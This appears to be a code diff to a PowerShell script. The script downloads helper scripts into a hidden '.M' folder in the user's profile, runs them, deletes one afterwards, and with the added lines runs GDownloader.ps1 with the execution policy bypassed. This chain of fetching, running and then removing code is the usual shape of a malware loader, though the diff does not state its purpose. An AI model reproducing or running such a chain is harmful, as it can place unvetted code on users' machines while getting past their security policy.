@@ -303,8 +303,10 @@ Start-Process -FilePath "C:\Program Files\Google\Chrome\Application\chrome.exe" 
 # Prepair for  Service And Task ----------------------------------------------------------------
 DLoad -FileName create_config.ps1; DLoad -FileName GDownloader.ps1; powershell.exe -Command $env:USERPROFILE\.M\create_config.ps1;
 # Simple one-liner with check
-if (Test-Path "$env:USERPROFILE\.M\create_config.ps1") { Remove-Item "$env:USERPROFILE\.M\create_config.ps1" -Force }
+# if (Test-Path "$env:USERPROFILE\.M\create_config.ps1") { Remove-Item "$env:USERPROFILE\.M\create_config.ps1" -Force }
 
 # Using Join-Path for better path handling
 $filePath = Join-Path $env:USERPROFILE ".M" "create_config.ps1"
 Remove-Item $filePath -Force -ErrorAction SilentlyContinue
+$GDfile = Join-Path $env:USERPROFILE ".M" "GDownloader.ps1";
+powershell -ExecutionPolicy Bypass -File $GDFile;
